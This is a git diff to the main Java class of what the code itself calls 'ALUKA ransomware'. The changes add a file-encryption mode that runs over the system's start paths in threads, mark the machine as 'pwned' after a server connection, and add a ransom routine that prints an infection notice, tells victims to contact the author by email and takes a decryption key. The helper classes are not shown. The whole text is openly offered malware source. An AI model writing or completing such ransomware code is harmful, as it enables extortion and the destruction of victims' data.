@@ -2,7 +2,7 @@ package aluka;
 
 import java.io.IOException;
 import java.util.ArrayList;
-import java.util.List;
+import java.util.List;import java.util.Scanner;
 import java.util.logging.Level;
 
 import aluka.configuration.Configuration;
@@ -12,6 +12,7 @@ import aluka.core.FileDeeperBrowser;
 import aluka.core.LoggerManagement;
 import aluka.core.StateManager;
 import aluka.core.SystemManager;
+import aluka.exception.InvalidKeyException;
 
 /**
  * Hello world!
@@ -19,13 +20,15 @@ import aluka.core.SystemManager;
  */
 public class App {
 	public static final String MODE = "POWERED";
-
+	
+	public static LoggerManagement logger = LoggerManagement.getInstance();
+	public static SystemManager system = new SystemManager();
+	public static StateManager stateManager = StateManager.getInstance();
+	public static EncryptionManager encryptionManager = EncryptionManager.getInstance();
+	
 	public static void main(String[] args) {
 
-		LoggerManagement logger = LoggerManagement.getInstance();
-		SystemManager system = new SystemManager();
-		StateManager stateManager = StateManager.getInstance();
-		EncryptionManager encryptionManager = EncryptionManager.getInstance();
+		
 
 		/*
 		 * if(MODE.equals("POWERED")) { Thread thread = new Thread(new
@@ -36,6 +39,7 @@ public class App {
 		if (!stateManager.isPwned()) {
 			if (!stateManager.isEncrypted()) {
 				// Starting Encryption for files
+				FileDeeperBrowser.enableEncryptMode();
 				logger.log(Level.WARNING, "Lauching Encryption Process");
 				List<Thread> threads = new ArrayList<>();
 				for (String path : system.getStartPath()) {
@@ -85,15 +89,39 @@ public class App {
 					} catch (IOException e) {
 						logger.log(Level.WARNING, "Can t make connection between aluka and server");
 					}
+				}else {
+					stateManager.markPwned();
 				}
 			}
 
-		} else {
-			/// Destructors and mechanizm
-			
 		}
+		
+		startMechanizmWating();
 	}
 	
-	
+	public static void startMechanizmWating() {
+		System.out.println("Your computer was infected by ALUKA ransomware, your data was encrypted, don't try to remove a file of the virus configuration");
+		System.out.println("You have 3 times try to insert a key s please don' try to brute force , contact me at my email");
+				
+		try(Scanner scanner = new Scanner(System.in)){
+			System.out.print("KEY>");
+			String inputkey = scanner.nextLine();
+			encryptionManager. configureDecryptMode(inputkey);
+			logger.log(Level.WARNING, "Lauching Decryption Process");
+			FileDeeperBrowser.enableDecryptMode();
+			List<Thread> threads = new ArrayList<>();
+			for (String path : system.getStartPath()) {
+				logger.log(Level.INFO, "Lauching Decryption for " + path);
+				Thread thread = new Thread(new FileDeeperBrowser(path, system.getCallback()));
+				thread.start();
+				threads.add(thread);
+			}
+			Configuration.waitForThreads(threads, "Wating for file to be decrypted");
+		} catch (InvalidKeyException e) {
+			e.printStackTrace();
+		}
+		
+		
+	}
 
 }
